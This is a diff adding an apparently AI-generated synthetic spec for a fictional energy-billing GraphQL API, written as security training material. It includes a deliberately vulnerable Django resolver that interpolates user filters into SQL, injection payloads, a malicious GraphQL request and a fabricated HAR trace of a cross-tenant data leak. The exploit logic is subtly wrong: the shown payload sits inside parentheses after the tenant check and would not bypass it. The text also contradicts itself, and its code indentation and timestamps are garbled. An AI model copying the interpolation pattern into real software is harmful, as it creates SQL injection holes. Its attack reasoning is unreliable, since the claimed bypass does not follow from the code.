@@ -1,0 +1,219 @@
+Here is the thirty-fourth system, focusing on GraphQL-specific security failures. We are shifting into the **Energy / Utility Billing** sector, focusing on a **Customer Billing & Consumption GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 5.1 (Authorization-Bypass Injection)** combined with **Pattern 9.1 (GraphQL Operations / Query Injection)**. This scenario demonstrates how an attacker exploits a dynamically constructed SQL query within a GraphQL resolver by injecting a logical operator, bypassing the multi-tenant BOLA check to extract every customer's full billing history.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** PowerGrid Customer Billing GraphQL API
+**Document Version:** 4.0.0 (FINAL)
+**Classification:** CONFIDENTIAL / FINANCIAL PII & CONSUMPTION DATA SCOPE
+**Domain:** Energy / Utilities / Customer Billing
+
+## 1.0 Executive Summary
+PowerGrid provides energy services to a large region, utilizing a multi-tenant model to service both retail and commercial clients (each client is a tenant). The GraphQL API allows authenticated clients to query their historical consumption data, current balance, and download PDF invoices.
+
+The core security requirement is BOLA and tenant isolation: A client should only be able to query the records where the `tenant_id` of the requested object matches the `tenant_id` of the authenticated user's session. The API exposes a `filter` argument on the `invoices` query to allow clients to customize result sets (e.g., filter by month).
+
+## 2.0 Comprehensive Network Topology & GraphQL Processing
+The architecture relies on a dynamically-constructed SQL layer.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **API Gateway (Go-lang):** Handles initial JWT validation.
+* **GraphQL Resolver Engine (Python Django):** The central routing layer that translates GraphQL queries into database lookups using string interpolation for filtering logic.
+
+### 2.2 The Backend Core Services
+* **Billing Service (Python Django):** Utilizes a PostgreSQL database where all customer billing records are stored in a single table.
+* **Authorization Logic:** The resolver attempts to prepend a BOLA predicate to the query string, but the use of the client-supplied filter argument allows the attacker to nullify this predicate.
+
+## 3.0 Identity, Sessions, and Object Authorization
+The security model relies on tenant IDs in the JWT being appended to the SQL query.
+
+### 3.1 Client Authentication (JWT)
+Clients authenticate via standard OAuth 2.0, receiving a JWT containing their `tenant_id`.
+
+### 3.2 The Filter-to-SQL Flaw
+The `invoices` resolver is designed to construct a dynamic `WHERE` clause: `WHERE tenant_id = 'AUTH_TENANT' AND status = 'PAID' [AND client_filter_here]`. The client-supplied filter is inserted directly via string formatting without escaping or sanitization.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: We use string interpolation (Pattern 5.1) for dynamic filters in the Billing Service query logic to support complex user requests. This was done to avoid rewriting the entire database query layer. We rely on the BOLA predicate being prepended to the query. Tracked as RISK-GRPH-501.*
+
+### 4.1 Vulnerability A: GraphQL Filter Argument leading to Authorization-Bypass SQL Injection (BOLA)
+**Taxonomy Pattern:** 5.1 (Authorization-bypass injection) & 9.1 (GraphQL Operations)
+**Sub-system:** Billing Service Resolver (`Query: invoices(filter: String)`)
+
+**The Deep Architectural Flaw:**
+This attack leverages SQL Injection to modify the BOLA predicate and retrieve records belonging to all tenants.
+
+1. **Authorization-Bypass Injection (Pattern 5.1):** The resolver begins the query with `WHERE tenant_id = 'ATTACKER_TENANT'`. The attacker injects a logical condition into the filter argument that forces the query to always be true, effectively removing the tenant constraint: `' OR 1=1 --`.
+
+2. **The Query Construction:** The backend constructs the final, vulnerable SQL string.
+Authenticated Tenant ID: `TENANT_A`
+Attacker Filter Input: `paid_date > '2026-01-01' OR 1=1 --`
+Vulnerable Constructed SQL: SELECT * FROM invoices WHERE tenant_id = 'TENANT_A' AND (paid_date > '2026-01-01' OR 1=1 --) AND status = 'PAID' (The attacker's OR condition nullifies the tenant check if the developer is unaware of order of operations). A simpler, more direct attack is to overwrite the entire BOLA check if the filtering logic is poorly implemented.
+3. **Direct SQL Predicate Injection (Pattern 9.1):** A more direct flaw often found in dynamic filtering: the resolver receives the tenant ID from the JWT and the filter from the user, then merges them with AND/OR logic. By injecting `OR tenant_id IS NOT NULL` (or similar), the attacker forces the query to include all tenants.
+
+**The Exploitation Path:**
+
+1. **The Setup:** An attacker obtains a valid JWT for their tenant (`TENANT_A`).
+2. **The Injection Query:** The attacker crafts a GraphQL query to the `invoices` resolver, passing a malicious string to the `filter` argument.
+3. **The Execution:** The resolver constructs an invalid SQL query. The successful `200 OK` response returns thousands of invoices, including highly sensitive consumption and financial data belonging to competitor tenants.
+
+***
+
+# POWERGRID BILLING API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 3.1.1
+**Applies to Architecture:** PowerGrid Customer Billing GraphQL API v4.0.0
+
+## 5.0 Billing Database Schema (PostgreSQL)
+The database uses a single table for invoices, making tenant isolation critical.
+
+```sql
+-- Customer Invoices Ledger
+CREATE TABLE invoices (
+invoice_id UUID PRIMARY KEY,
+tenant_id VARCHAR(50) NOT NULL, -- CRITICAL BOLA FIELD
+billing_period DATE NOT NULL,
+total_amount DECIMAL(10, 2),
+consumption_kwh INT,
+paid_date DATE,
+status VARCHAR(20) DEFAULT 'UNPAID'
+);
+
+CREATE INDEX idx_invoice_tenant ON invoices(tenant_id, billing_period);
+```
+
+## 6.0 The Flawed Implementation (Python / Django Resolver)
+The resolver implements the string interpolation flaw, allowing the client's input to override the intended BOLA predicate.
+
+### 6.1 Vulnerable GraphQL Resolver
+```pythonFile: resolvers/billingResolvers.py
+
+def resolve_invoices(root, info, filter=None):
+tenant_id = info.context.user.tenantId
+base_query = "SELECT * FROM invoices WHERE tenant_id = '%s'" % tenant_id
+# VULNERABILITY 5.1 & 9.1: Authorization Bypass Injection
+# The client-supplied 'filter' string is concatenated directly without sanitization or parameter binding.
+if filter:
+    # Attacker passes: 'billing_period > NOW() OR 1=1'
+    # The constructed query becomes: WHERE tenant_id = 'TENANT_A' AND (billing_period > NOW() OR 1=1)
+    base_query += " AND (%s)" % filter 
+
+# The query is executed against the database 
+invoices = db.execute(base_query) 
+return invoices
+```
+
+## 7.0 GraphQL API Contract (The Filter Injection)
+The attacker queries the field name, inserting a malicious SQL predicate into the filter argument.
+
+### 7.1 Execute SQLi BOLA Bypass
+**Endpoint:** `POST /graphql`
+**Description:** Queries the `invoices` field, injecting SQL to nullify the `tenant_id` check.
+
+**Required Headers:**
+```http
+Authorization: Bearer <Attacker_TenantA_JWT>
+Content-Type: application/json
+```
+
+**Malicious Request Payload:**
+```graphql
+query MassInvoiceLeak {
+invoices(filter: "billing_period < '2026-04-01' OR tenant_id IS NOT NULL") {
+invoiceId
+tenantId # Field is returned, confirming leak
+consumptionKwh
+totalAmount
+}
+}
+```
+
+**Success Response (200 OK - Mass Data Leak):**
+The response returns thousands of records, including those belonging to other tenants.
+```json
+{
+"data": {
+"invoices": [
+{
+"invoiceId": "inv-99182A",
+"tenantId": "TENANT_A",
+"consumptionKwh": 1250,
+"totalAmount": 150.00
+},
+{
+"invoiceId": "inv-10001B",
+"tenantId": "COMPETITOR_CORP_Z",
+"consumptionKwh": 55000,
+"totalAmount": 6120.00
+},
+{
+"invoiceId": "inv-10002C",
+"tenantId": "TENANT_MUNICIPAL_X",
+"consumptionKwh": 190000,
+"totalAmount": 21000.00
+}
+]
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL SQLI AUTHORIZATION BYPASS (HAR TRACE)
+**Applies to Architecture:** PowerGrid Customer Billing GraphQL API v4.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 5.1 & Pattern 9.1)
+
+This HTTP Archive (HAR) trace captures the moment an attacker exploits the dynamic filtering logic in the GraphQL resolver to execute an Authorization-Bypass SQL Injection. The attacker submits a query to the `/graphql` endpoint, using a valid token for `TENANT_A`.
+
+The `filter` argument is injected with the malicious predicate `OR tenant_id IS NOT NULL`. The Python backend resolver blindly interpolates this string into the SQL `WHERE` clause, causing the BOLA check to be nullified. The successful `200 OK` response returns invoices belonging to other, unauthorized tenants (`COMPETITOR_CORP_Z` and `TENANT_MUNICIPAL_X`), confirming a massive cross-tenant data leak of sensitive consumption data.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Go-lang API Gateway / Python Resolver Logs",
+"version": "4.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T13:05:10.055Z",
+"time": 112,
+"request": {
+"method": "POST",
+"url": "https://api.powergrid.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.powergrid.com" },
+{ "name": "authorization", "value": "Bearer TENA_JWT_88192A..." },
+{ "name": "content-type", "value": "application/json" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"query MassInvoiceLeak { invoices(filter: \\\"billing_period < '2026-04-01' OR tenant_id IS NOT NULL\\\") { invoiceId tenantId consumptionKwh totalAmount } }\"}"
+},
+"bodySize": 255
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-records-returned", "value": "4122" }
+],
+"content": {
+"size": 512000,
+"mimeType": "application/json",
+"text": "{\"data\": {\"invoices\": [{\"invoiceId\": \"inv-99182A\", \"tenantId\": \"TENANT_A\", \"consumptionKwh\": 1250, \"totalAmount\": 150.00}, {\"invoiceId\": \"inv-10001B\", \"tenantId\": \"COMPETITOR_CORP_Z\", \"consumptionKwh\": 55000, \"totalAmount\": 6120.00}, {\"invoiceId\": \"inv-10002C\", \"tenantId\": \"TENANT_MUNICIPAL_X\", \"consumptionKwh\": 190000, \"totalAmount\": 21000.00}, ... ]}}"
+},
+"bodySize": 512000
+}
+}
+]
+}
+}
+```
+
+***
